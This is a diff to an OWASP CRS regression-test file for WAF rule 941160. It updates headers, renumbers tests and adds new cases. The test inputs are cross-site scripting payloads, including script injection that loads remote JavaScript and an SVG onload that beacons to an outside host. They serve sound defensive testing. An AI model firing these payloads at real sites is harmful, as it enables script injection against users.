@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "csanders-git, Franziska Bühler"
+  author: "csanders-git, Franziska Bühler, Walter Hop, Xhoenix"
   enabled: true
   name: "941160.yaml"
   description: "Tests to trigger, or not trigger 941160"
@@ -15,8 +15,9 @@ tests:
             port: 80
             uri: '/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
             headers:
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-2
@@ -29,8 +30,9 @@ tests:
             port: 80
             uri: '/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E'
             headers:
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-3
@@ -43,8 +45,9 @@ tests:
             port: 80
             uri: '/char_test?mime=text/xml&body=%3Cx%20onend%3D'
             headers:
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-4
@@ -57,8 +60,9 @@ tests:
             port: 80
             uri: '/char_test?mime=text/xml&body=%22onzoom%3D'
             headers:
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-5
@@ -71,8 +75,9 @@ tests:
             port: 80
             uri: '/char_test?mime=text/xml&body=%27formaction%3D'
             headers:
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-6
@@ -85,8 +90,9 @@ tests:
             port: 80
             uri: '/char_test?mime=text/xml&body=%3C%20x%3A%20script'
             headers:
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-7
@@ -99,8 +105,9 @@ tests:
             port: 80
             uri: '/char_test?mime=text/xml&body=$%3Cf%20o%20r%20m'
             headers:
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-8
@@ -113,8 +120,9 @@ tests:
             port: 80
             uri: '/'
             headers:
-              User-Agent: "ModSecurity CRS 3 Tests %3Cf%20o%20r%20m"
+              User-Agent: "OWASP ModSecurity Core Rule Set %3Cf%20o%20r%20m"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-9
@@ -127,9 +135,10 @@ tests:
             port: 80
             uri: '/'
             headers:
-              User-Agent: "ModSecurity CRS 3 Tests"
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
               Referer: 'https://coreruleset.org/?%3Cf%20o%20r%20m'
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
   - test_title: 941160-10
@@ -142,12 +151,13 @@ tests:
             port: 80
             uri: '/'
             headers:
-              User-Agent: "ModSecurity CRS 3 Tests %3Cf%20o%20r%20m"
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
               Cookie: 'PHPSESSID%3Cf%20o%20r%20m=1234'
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
-  - test_title: 941160-10
+  - test_title: 941160-11
     desc: "just another XSS teststring: '<f o r m' in Cookie value"
     stages:
       - stage:
@@ -157,12 +167,13 @@ tests:
             port: 80
             uri: '/'
             headers:
-              User-Agent: "ModSecurity CRS 3 Tests"
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
               Cookie: 'PHPSESSID=1234%3Cf%20o%20r%20m'
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
-  - test_title: 941160-11
+  - test_title: 941160-12
     desc: "just another XSS teststring: '<f o r m' in ARG NAME"
     stages:
       - stage:
@@ -172,11 +183,12 @@ tests:
             port: 80
             uri: '/?foo%3Cf%20o%20r%20m=bar'
             headers:
-              User-Agent: "ModSecurity CRS 3 Tests"
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
-  - test_title: 941160-12
+  - test_title: 941160-13
     desc: "just another XSS teststring: '<f o r m' in ARG VALUE"
     stages:
       - stage:
@@ -186,7 +198,56 @@ tests:
             port: 80
             uri: '/?foo=bar%3Cf%20o%20r%20m'
             headers:
-              User-Agent: "ModSecurity CRS 3 Tests"
+              User-Agent: "OWASP CRS test agent"
               Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          output:
+            log_contains: id "941160"
+  - test_title: 941160-14
+    desc: "SVG onload injection with remote image"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var='\"><svg/onload=(new(Image)).src='//m8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7\\56coreruleset.org'>"
+            version: HTTP/1.0
+          output:
+            log_contains: id "941160"
+  - test_title: 941160-15
+    desc: "SVG onload injection in filename"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/index.php/%3Csvg/onload=alert()"
+            version: HTTP/1.0
+          output:
+            log_contains: id "941160"
+  - test_title: 941160-16
+    desc: "Detect XSS injection of 'dialog' tag ('<d i a l o g')"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: GET
+            port: 80
+            uri: '/get?mime=text/xml&body=$%3Cd%20i%20a%20l%20o%20g'
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: localhost
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           output:
             log_contains: id "941160"
